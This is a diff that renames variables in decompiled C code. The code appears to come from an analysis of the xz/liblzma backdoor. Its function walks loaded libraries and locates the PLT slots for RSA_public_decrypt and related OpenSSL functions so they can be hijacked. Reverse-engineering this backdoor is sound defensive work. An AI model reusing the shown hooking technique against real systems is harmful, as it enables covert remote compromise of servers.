@@ -22,46 +22,46 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   void **rsa_get0_key_slot;
   void **evp_set1_rsa_slot;
   void **rsa_public_decrypt_slot;
-  elf_info_t *peVar5;
-  link_map *plVar6;
-  backdoor_data_t *pbVar7;
-  backdoor_hooks_data_t **ppbVar8;
-  EncodedStringId EVar9;
-  BOOL BVar10;
-  Elf64_Sym *pEVar11;
+  elf_info_t *elf_info;
+  link_map *map_cursor;
+  backdoor_data_t *shared_maps;
+  backdoor_hooks_data_t **hooks_data_addr_ptr;
+  EncodedStringId basename_id;
+  BOOL success;
+  Elf64_Sym *rtld_global_sym;
   uchar *rtld_global_ptr;
   ulong *plt_entry;
   void *hooks_blob;
-  char *string_end;
-  char *string_begin;
-  u64 local_30;
+  char *soname_cursor;
+  char *basename_ptr;
+  u64 liblzma_data_segment_size;
   
   if (r_map == (link_map *)0x0) {
     return FALSE;
   }
-  pEVar11 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
-  if (pEVar11 == (Elf64_Sym *)0x0) {
+  rtld_global_sym = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
+  if (rtld_global_sym == (Elf64_Sym *)0x0) {
     return FALSE;
   }
   do {
     if (*(ulong *)(r_map + 0x18) == 0) {
-      pbVar7 = data->data;
-      if (pbVar7->main_map == (link_map *)0x0) {
+      shared_maps = data->data;
+      if (shared_maps->main_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (pbVar7->libcrypto_map == (link_map *)0x0) {
+      if (shared_maps->libcrypto_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (pbVar7->dynamic_linker_map == (link_map *)0x0) {
+      if (shared_maps->dynamic_linker_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (pbVar7->libsystemd_map == (link_map *)0x0) {
+      if (shared_maps->libsystemd_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (pbVar7->liblzma_map == (link_map *)0x0) {
+      if (shared_maps->liblzma_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (pbVar7->libc_map == (link_map *)0x0) {
+      if (shared_maps->libc_map == (link_map *)0x0) {
         return FALSE;
       }
       break;
@@ -69,38 +69,38 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
     if (*(ulong *)r_map == 0) {
       return FALSE;
     }
-    string_end = *(char **)(r_map + 8);
-    if (string_end == (char *)0x0) {
+    soname_cursor = *(char **)(r_map + 8);
+    if (soname_cursor == (char *)0x0) {
       return FALSE;
     }
     if (*(ulong *)(r_map + 0x10) == 0) {
       return FALSE;
     }
-    string_begin = string_end;
-    if (*string_end == '\0') {
+    basename_ptr = soname_cursor;
+    if (*soname_cursor == '\0') {
       if (data->data->main_map != (link_map *)0x0) {
         return FALSE;
       }
       data->data->main_map = r_map;
     }
     else {
-      while (name_char = *string_end, name_char != '\0') {
-        string_end = string_end + 1;
+      while (name_char = *soname_cursor, name_char != '\0') {
+        soname_cursor = soname_cursor + 1;
         if (name_char == '/') {
-          string_begin = string_end;
+          basename_ptr = soname_cursor;
         }
       }
-      EVar9 = get_string_id(string_begin,string_end);
-      pbVar7 = data->data;
-      if (EVar9 == STR_libc_so) {
-        if (pbVar7->libc_map != (link_map *)0x0) {
+      basename_id = get_string_id(basename_ptr,soname_cursor);
+      shared_maps = data->data;
+      if (basename_id == STR_libc_so) {
+        if (shared_maps->libc_map != (link_map *)0x0) {
           return FALSE;
         }
-        pbVar7->libc_map = r_map;
+        shared_maps->libc_map = r_map;
       }
-      else if (EVar9 < 0x7d1) {
-        if (EVar9 == STR_liblzma_so) {
-          if (pbVar7->liblzma_map != (link_map *)0x0) {
+      else if (basename_id < 0x7d1) {
+        if (basename_id == STR_liblzma_so) {
+          if (shared_maps->liblzma_map != (link_map *)0x0) {
             return FALSE;
           }
           if (0x10465f < *(ulong *)r_map) {
@@ -112,72 +112,72 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
           if (*(ulong *)(r_map + 0x18) == 0) {
             return FALSE;
           }
-          pbVar7->liblzma_map = r_map;
+          shared_maps->liblzma_map = r_map;
         }
-        else if (EVar9 == STR_libcrypto_so) {
-          if (pbVar7->libcrypto_map != (link_map *)0x0) {
+        else if (basename_id == STR_libcrypto_so) {
+          if (shared_maps->libcrypto_map != (link_map *)0x0) {
             return FALSE;
           }
-          pbVar7->libcrypto_map = r_map;
+          shared_maps->libcrypto_map = r_map;
         }
       }
-      else if (EVar9 == STR_libsystemd_so) {
-        if (pbVar7->libsystemd_map != (link_map *)0x0) {
+      else if (basename_id == STR_libsystemd_so) {
+        if (shared_maps->libsystemd_map != (link_map *)0x0) {
           return FALSE;
         }
-        pbVar7->libsystemd_map = r_map;
+        shared_maps->libsystemd_map = r_map;
       }
-      else if (EVar9 == STR_ld_linux_x86_64_so) {
-        if (pbVar7->dynamic_linker_map != (link_map *)0x0) {
+      else if (basename_id == STR_ld_linux_x86_64_so) {
+        if (shared_maps->dynamic_linker_map != (link_map *)0x0) {
           return FALSE;
         }
-        peVar5 = data->elf_handles->dynamic_linker;
-        rtld_global_ptr = peVar5->elfbase->e_ident + pEVar11->st_value;
+        elf_info = data->elf_handles->dynamic_linker;
+        rtld_global_ptr = elf_info->elfbase->e_ident + rtld_global_sym->st_value;
         if (r_map <= rtld_global_ptr) {
           return FALSE;
         }
-        if (pEVar11->st_size < (ulong)((long)r_map - (long)rtld_global_ptr)) {
+        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_ptr)) {
           return FALSE;
         }
-        if (*(Elf64_Dyn **)(r_map + 0x10) != peVar5->dyn) {
+        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_info->dyn) {
           return FALSE;
         }
-        pbVar7->dynamic_linker_map = r_map;
+        shared_maps->dynamic_linker_map = r_map;
       }
     }
-    pbVar7 = data->data;
+    shared_maps = data->data;
     r_map = *(link_map **)(r_map + 0x18);
-  } while ((((pbVar7->main_map == (link_map *)0x0) || (pbVar7->libcrypto_map == (link_map *)0x0)) ||
-           (pbVar7->dynamic_linker_map == (link_map *)0x0)) ||
-          (((pbVar7->libsystemd_map == (link_map *)0x0 || (pbVar7->liblzma_map == (link_map *)0x0))
-           || (pbVar7->libc_map == (link_map *)0x0))));
+  } while ((((shared_maps->main_map == (link_map *)0x0) || (shared_maps->libcrypto_map == (link_map *)0x0)) ||
+           (shared_maps->dynamic_linker_map == (link_map *)0x0)) ||
+          (((shared_maps->libsystemd_map == (link_map *)0x0 || (shared_maps->liblzma_map == (link_map *)0x0))
+           || (shared_maps->libc_map == (link_map *)0x0))));
   rsa_get0_key_slot = (undefined8 *)data->RSA_get0_key_plt;
   evp_set1_rsa_slot = (undefined8 *)data->EVP_PKEY_set1_RSA_plt;
   rsa_public_decrypt_slot = (undefined8 *)data->RSA_public_decrypt_plt;
-  peVar5 = data->elf_handles->main;
-  plVar6 = data->data->main_map;
-  if (plVar6 == (link_map *)0x0) {
+  elf_info = data->elf_handles->main;
+  map_cursor = data->data->main_map;
+  if (map_cursor == (link_map *)0x0) {
     return FALSE;
   }
-  BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5);
-  if (BVar10 == FALSE) {
+  success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info);
+  if (success == FALSE) {
     return FALSE;
   }
-  if (peVar5->gnurelro_found == FALSE) {
+  if (elf_info->gnurelro_found == FALSE) {
     return FALSE;
   }
-  if ((peVar5->flags & 0x20) == 0) {
+  if ((elf_info->flags & 0x20) == 0) {
     return FALSE;
   }
-  plt_entry = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_public_decrypt);
+  plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_public_decrypt);
   *rsa_public_decrypt_slot = plt_entry;
   if (plt_entry < (ulong *)0x1000000) {
-    plt_entry = (ulong *)elf_get_plt_symbol(peVar5,STR_EVP_PKEY_set1_RSA);
+    plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_EVP_PKEY_set1_RSA);
     *evp_set1_rsa_slot = plt_entry;
     if (((ulong *)0xffffff < plt_entry) && (0xffffff < *plt_entry)) {
       return FALSE;
     }
-    plt_entry = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_get0_key);
+    plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_get0_key);
     *rsa_get0_key_slot = plt_entry;
     if (plt_entry < (ulong *)0x1000000) goto LAB_00104924;
   }
@@ -185,25 +185,25 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
     return FALSE;
   }
 LAB_00104924:
-  plVar6 = data->data->libcrypto_map;
-  if ((plVar6 != (link_map *)0x0) &&
-     (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libcrypto), BVar10 != FALSE)) {
-    ppbVar8 = data->hooks_data_addr;
-    local_30 = 0;
-    peVar5 = data->elf_handles->liblzma;
-    plVar6 = data->data->liblzma_map;
-    if ((plVar6 != (link_map *)0x0) &&
-       (((BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5), BVar10 != FALSE &&
-         ((peVar5->flags & 0x20) != 0)) &&
-        (hooks_blob = elf_get_data_segment(peVar5,&local_30,TRUE), 0x597 < local_30)))) {
-      *ppbVar8 = (backdoor_hooks_data_t *)((long)hooks_blob + 0x10);
-      *(u64 *)((long)hooks_blob + 0x590) = local_30 - 0x598;
-      plVar6 = data->data->libc_map;
-      if ((plVar6 != (link_map *)0x0) &&
-         (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libc), BVar10 != FALSE)) {
-        BVar10 = resolve_libc_imports
+  map_cursor = data->data->libcrypto_map;
+  if ((map_cursor != (link_map *)0x0) &&
+     (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libcrypto), success != FALSE)) {
+    hooks_data_addr_ptr = data->hooks_data_addr;
+    liblzma_data_segment_size = 0;
+    elf_info = data->elf_handles->liblzma;
+    map_cursor = data->data->liblzma_map;
+    if ((map_cursor != (link_map *)0x0) &&
+       (((success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info), success != FALSE &&
+         ((elf_info->flags & 0x20) != 0)) &&
+        (hooks_blob = elf_get_data_segment(elf_info,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
+      *hooks_data_addr_ptr = (backdoor_hooks_data_t *)((long)hooks_blob + 0x10);
+      *(u64 *)((long)hooks_blob + 0x590) = liblzma_data_segment_size - 0x598;
+      map_cursor = data->data->libc_map;
+      if ((map_cursor != (link_map *)0x0) &&
+         (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libc), success != FALSE)) {
+        success = resolve_libc_imports
                            (data->data->libc_map,data->elf_handles->libc,data->libc_imports);
-        return (uint)(BVar10 != FALSE);
+        return (uint)(success != FALSE);
       }
     }
   }
